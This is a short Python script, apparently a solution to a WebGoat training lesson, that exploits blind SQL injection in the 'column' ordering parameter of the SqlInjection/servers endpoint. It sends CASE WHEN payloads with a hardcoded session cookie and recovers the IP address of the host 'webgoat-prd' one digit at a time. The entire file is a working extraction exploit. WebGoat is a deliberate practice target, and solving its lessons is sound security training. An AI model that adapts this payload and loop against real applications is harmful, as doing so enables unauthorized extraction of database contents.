import requests

password = str()

url = "http://172.20.100.28:8080/WebGoat/SqlInjection/servers"
cookie = {'JSESSIONID': 'B30C01C30D5696AB0DC907A79D3738A0'}

print 'Find ip of web-goat-prd'
ip = ""
for i in range(4):
    for j in range(3):
        for k in range(0, 10):
            payload = "(CASE WHEN (SELECT ip FROM servers WHERE hostname ='webgoat-prd') LIKE '%s%c' THEN hostname ELSE id END)" % (ip + str(k), '%')
            data= {'column': payload}
            r = requests.get(url, data, cookies=cookie)

            if r.json()[0]['id'] == '3':
                ip += str(k)
                break

    ip += "."
print 'Found !!!'
ip = ip.rstrip('.')

print ip

